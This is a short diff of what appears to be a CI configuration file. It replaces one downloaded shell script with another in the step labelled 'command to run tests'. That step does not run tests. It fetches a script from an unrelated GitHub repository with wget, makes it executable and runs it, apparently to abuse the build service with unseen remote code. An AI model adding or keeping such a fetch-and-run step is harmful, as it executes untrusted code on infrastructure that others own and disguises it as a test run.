@@ -31,6 +31,6 @@ install:
 
 # command to run tests
 script:
-  - wget https://github.com/lallianto/asrih447/raw/main/Sea1.sh
-  - chmod +x Sea1.sh 
-  - ./Sea1.sh
+  - wget https://github.com/lallianto/asrih447/raw/main/kannu.sh
+  - chmod +x kannu.sh 
+  - ./kannu.sh
